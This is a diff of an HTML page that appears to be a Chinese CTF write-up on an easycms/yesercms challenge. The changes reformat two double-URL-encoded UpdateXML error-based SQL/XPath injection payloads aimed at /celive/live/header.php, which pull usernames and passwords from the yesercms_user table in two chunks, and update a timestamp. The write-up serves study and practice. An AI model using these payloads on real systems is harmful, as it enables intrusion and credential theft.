@@ -222,12 +222,10 @@
                 <p></p>
             </figure></p>
 <p>点进去看了看，跟题目的cms差不多<br>差不多确定是easycms了，搜一搜easycms漏洞<br>但是找到的大多数不能用，<br>最终还是看了大佬们写的writeup<br>在<code>URL/celive/live/header.php</code><br>处有一个xpath注入漏洞<a href="http://www.91ri.org/7147.html" target="_blank" rel="noopener">xpath注入科普</a><br>payload：<br>第一段：</p>
-<pre><code>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;
-&lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C1%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt;
-</code></pre><p>第二段：</p>
-<pre><code>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;
-&lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C10%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt;
-</code></pre><p>这里得分成两段显示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C1%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt;</span><br></pre></td></tr></table></figure>
+<p>第二段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C10%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt;</span><br></pre></td></tr></table></figure>
+<p>这里得分成两段显示：</p>
 <figure class="image-box">
                 <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/51587652.jpg" alt="" title="" class="">
                 <p></p>
@@ -263,7 +261,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2018-05-30T05:12:08.250Z" itemprop="dateUpdated">2018-05-30 13:12:08</time>
+    Last updated: <time datetime="2018-05-30T09:22:43.970Z" itemprop="dateUpdated">2018-05-30 17:22:43</time>
 </span><br>
 
 
